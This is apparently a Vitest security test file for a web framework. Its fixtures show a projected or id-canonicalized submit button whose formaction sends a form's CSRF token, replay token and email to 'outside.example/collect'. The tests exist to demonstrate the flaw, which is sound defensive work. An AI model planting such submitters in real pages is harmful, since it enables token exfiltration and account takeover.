import { afterEach, expect, it } from 'vitest';

const initialBody = document.body.innerHTML;

afterEach(() => {
  document.body.innerHTML = initialBody;
});

it('shows that a projected descendant submitter can exfiltrate typed-form authority', () => {
  // This is the DOM produced by a component that renders `{children}` inside its typed form. The
  // compiler rereview fixture proves cab9c34a5 accepts the corresponding TSX with zero KV242.
  document.body.innerHTML = `
    <form id="account-save" action="/_m/account/save" method="post" data-mutation="account/save">
      <input type="hidden" name="kovo-csrf" value="victim-csrf-token">
      <input type="hidden" name="Kovo-Idem" value="victim-replay-token">
      <input name="email" value="victim@example.test">
      <button
        id="projected-submit"
        formaction="https://outside.example/collect"
        formmethod="post"
        name="intent"
        value="exfiltrate"
      >Send</button>
    </form>
  `;

  const form = document.querySelector<HTMLFormElement>('#account-save');
  const submitter = document.querySelector<HTMLButtonElement>('#projected-submit');
  if (!form || !submitter) throw new Error('missing projected submitter fixture');

  expect(submitter.form).toBe(form);
  expect(submitter.formAction).toBe('https://outside.example/collect');
  expect(submitter.formMethod).toBe('post');

  const body = new FormData(form, submitter);
  expect(body.get('kovo-csrf')).toBe('victim-csrf-token');
  expect(body.get('Kovo-Idem')).toBe('victim-replay-token');
  expect(body.get('email')).toBe('victim@example.test');
  expect(body.get('intent')).toBe('exfiltrate');
});

it('shows that HTML id canonicalization can retarget a proven-native submitter', () => {
  document.body.innerHTML = `
    <form id="account\u0000save" action="/_m/account/save" method="post" data-mutation="account/save">
      <input type="hidden" name="kovo-csrf" value="victim-csrf-token">
      <input type="hidden" name="Kovo-Idem" value="victim-replay-token">
    </form>
    <form id="account�save" action="https://preview.example/form" method="get"></form>
    <button
      id="canonicalized-submit"
      form="account�save"
      formaction="https://outside.example/collect"
      formmethod="post"
    >Send</button>
  `;

  const forms = document.querySelectorAll<HTMLFormElement>('form');
  const typed = forms.item(0);
  const native = forms.item(1);
  const submitter = document.querySelector<HTMLButtonElement>('#canonicalized-submit');
  if (!typed || !native || !submitter) throw new Error('missing canonicalized-id fixture');

  expect(typed.id).toBe('account�save');
  expect(native.id).toBe('account�save');
  expect(submitter.form).toBe(typed);
  expect(new FormData(submitter.form, submitter).get('kovo-csrf')).toBe('victim-csrf-token');
  expect(submitter.formAction).toBe('https://outside.example/collect');
});
